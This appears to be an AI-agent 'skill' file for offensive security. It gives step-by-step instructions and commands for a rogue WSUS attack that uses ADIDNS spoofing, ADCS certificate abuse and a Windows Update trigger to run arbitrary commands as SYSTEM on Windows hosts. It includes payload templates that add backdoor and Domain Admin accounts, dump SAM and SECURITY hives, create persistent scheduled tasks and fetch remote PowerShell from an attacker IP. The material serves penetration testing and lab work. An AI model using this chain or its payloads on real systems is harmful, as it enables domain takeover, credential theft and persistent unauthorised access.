---
description: "Rogue WSUS server + ADIDNS spoofing + WU trigger pipeline — make a target Windows client/server pull a Microsoft-signed binary (PsExec64.exe) from attacker-controlled WSUS and execute an arbitrary command as SYSTEM. Use when target has WSUS policy pointing to a hostname attacker can control (via ADIDNS insert or existing CNAME gap) AND attacker has a TLS cert valid for that hostname (typically via ADCS template abuse). Provides CSR generator, wsuks patch for HTTP Range, ADIDNS helper, WU scan/download/install trigger, and payload command templates. Each component usable standalone."
---

# /wsus-mitm — Rogue WSUS code execution as SYSTEM

**Purpose**: Bundle the scripts + patches needed to turn "I control WSUS hostname resolution + I have TLS cert for it" into "SYSTEM shell on the target".

## Pre-requisites (check before invoking)

On target side:
- Registry `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate` has `WUServer` / `WUStatusServer` (verify via WinRM or any other read primitive).
- The WSUS hostname is **not a DC on the same box** (or if it is, `UseWUServer=1` + config → attacker-attackable).
- Port 8530 (HTTP) or 8531 (HTTPS) reachable from the target to your attacker IP.

Attacker side (in order):
1. **DNS control**: ADIDNS write perm (Authenticated Users default on zone), or LLMNR-spoofable path — if hostname already resolves somewhere you don't control, stop.
2. **TLS cert for hostname**: only needed if WUServer uses `https://`. Usually ADCS ESC1 (template w/ enrollee-supplies-subject + server-auth EKU) or a compromised CA admin.
3. **Execution primitive to trigger WU on target**: WinRM, RDP, CIM, `schtasks /run`, etc.

If any of the three is missing, you're not ready for this skill — go get it first.

## Why this attack works (1-para context)

Microsoft's Windows Update Agent trusts its configured WSUS server completely. If that server returns metadata pointing to a payload and the payload is **signed by Microsoft**, the agent will download → verify signature → run it as `NT AUTHORITY\SYSTEM`. So attackers don't need to bypass signature checks — they ship a legitimately-signed binary (PsExec64.exe, BgInfo.exe, SDelete.exe, etc.) with command-line arguments that do the evil. `wsuks` automates this and bundles PsExec64.exe.

## Components

```
scripts/
├── generate_csr.sh       — build RSA key + CSR with SAN (feed to ADCS)
├── build_wsus_pem.sh     — combine cert+key into single PEM for wsuks --tls-cert
├── adidns_add.sh         — wrap dnstool to add DNS A record
├── trigger_wu.sh         — WinRM payload: stop/start wuauserv, scan, download, install
└── patch_wsuks.py        — patch wsuks to handle HTTP Range headers (else Win DO resets)
```

## Flow (reference, not lock-step)

Skip/reorder steps as your situation demands:

### 1. Get CSR → ADCS → signed cert

```bash
# A. build CSR on attacker box
bash scripts/generate_csr.sh wsus.example.com wsus.example.com dc01.example.com
# → /tmp/wsus-mitm/wsus.key + wsus.csr

# B. submit to ADCS (multiple paths; pick what fits)
#    - certipy -target CA -template UpdateSrv -upn you (if ESC1)
#    - Upload CSR + run `certreq -submit -attrib "CertificateTemplate:X" ...` via the user context that has enroll right
#      (e.g. DLL-hijack-pivot-to-IT-user scenario from the original HTB Logging chain)
# → wsus.cer

# C. combine for wsuks
bash scripts/build_wsus_pem.sh wsus.cer /tmp/wsus-mitm/wsus.key /tmp/wsus-mitm/wsus_combined.pem
```

### 2. Patch wsuks (one-time per install)

`wsuks` <= 1.2.1's `do_GET` ignores `Range:` header. Windows Delivery Optimization probes with `Range: bytes=0-1` then `Range: bytes=0-N`; without 206 Partial Content response, connection resets and DL fails.

```bash
python3 scripts/patch_wsuks.py
# idempotent — prints "patch FAILED" if already applied
```

### 3. Add ADIDNS record

```bash
bash scripts/adidns_add.sh <DC_IP> wsus.example.com 10.10.14.20 -u 'EXAMPLE\alice' -p 'Pass123'
# Wait 1–3 min. Verify:
nslookup wsus.example.com <DC_IP>   # should → 10.10.14.20
```

### 4. Launch wsuks (serve-only mode)

```bash
# Custom command examples:
CMD_ADD_ADMIN='/accepteula /s cmd.exe /c net localgroup Administrators "EXAMPLE\msa_health$" /add'
CMD_REV_SHELL='/accepteula /s cmd.exe /c powershell -c "IEX(IWR http://10.10.14.20/s.ps1 -UseBasicParsing)"'
CMD_CREATE_USER='/accepteula /s cmd.exe /c net user backdoor Passw0rd! /add & net localgroup Administrators backdoor /add'

# Run under systemd-run so it survives shell exit in WSL
systemd-run --unit=wsuks --description='rogue WSUS' \
  wsuks --serve-only -t <TARGET_IP> -I tun0 --WSUS-Port 8531 \
    --tls-cert /tmp/wsus-mitm/wsus_combined.pem \
    -c "$CMD_ADD_ADMIN" --debug
# Monitor:
journalctl -u wsuks -f
```

### 5. Trigger WU on target

```bash
bash scripts/trigger_wu.sh <TARGET_IP> -u 'EXAMPLE\msa$' -H <HASH>
```

Watch for `AGENT_INSTALLING_SUCCEEDED` in target's
`C:\Windows\SoftwareDistribution\ReportingEvents.log`.

### 6. Validate pwnage

Your payload ran as SYSTEM. Validate via the admin outcome you were aiming at
(re-login WinRM, check group membership, read new shell, etc.).

## Common failures

| Symptom | Cause | Fix |
|---|---|---|
| `ConnectionResetError` right after first GET | wsuks not patched for Range | run `patch_wsuks.py` |
| Target resolves WSUS to wrong IP | ADIDNS write OK but Windows DNS cached NXDOMAIN | wait 3 min; or flush DNS via WinRM: `ipconfig /flushdns` |
| `Installation Failed` in ReportingEvents.log | signature check (binary not MS-signed) | use default bundled PsExec64.exe |
| target 404s / no connection in wsuks log | WUServer registry value doesn't match | double-check with: `Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate' \| Select WUServer` |
| `AGENT_DOWNLOAD_SUCCEEDED` but no install | download ≠ install | call `usoclient StartInstall` (already in `trigger_wu.sh`) |
| Cert rejected by Windows | CN / SAN mismatch vs `WUServer` URL | re-issue cert with proper SAN (must match exactly) |
| WUServer is `http://` not `https://` | don't need TLS; use `--WSUS-Port 8530` and drop `--tls-cert` | simpler path, skip cert step entirely |

## Payload command playbook (fill-in templates)

Pick one `-c` argument for wsuks. These are just examples — anything you can express as `cmd.exe /c ...` works.

```
# Add account to local Admins (classic):
/accepteula /s cmd.exe /c net localgroup Administrators "DOMAIN\user$" /add

# Add Domain Admin directly (if target is DC):
/accepteula /s cmd.exe /c net group "Domain Admins" backdoor /add /domain

# Cradle a reverse shell via PowerShell IEX:
/accepteula /s cmd.exe /c powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/r.ps1')"

# Dump SAM/LSA to ADMIN$ (needs SYSTEM which we have):
/accepteula /s cmd.exe /c reg save HKLM\SAM C:\Windows\Temp\sam & reg save HKLM\SECURITY C:\Windows\Temp\sec

# Persistence via scheduled task:
/accepteula /s cmd.exe /c schtasks /create /tn BD /tr "cmd.exe /c <whatever>" /sc onstart /ru SYSTEM /f
```

## Flexibility reminder

Every step has alternatives. ADIDNS not possible? Try LLMNR poisoning with responder. No cert? Try HTTP-only WSUS (port 8530). wsuks doesn't fit? Write minimal SOAP responder manually — protocol is documented in MS-WSUSSS. The primitives here are tools, not a mandated recipe.

## Scripts inventory

- `scripts/generate_csr.sh` — OpenSSL CSR with SAN list
- `scripts/build_wsus_pem.sh` — cert+key → single PEM
- `scripts/adidns_add.sh` — wrap dnstool `-a add`
- `scripts/trigger_wu.sh` — WinRM `usoclient` full scan/download/install
- `scripts/patch_wsuks.py` — idempotent source patch for Range header support
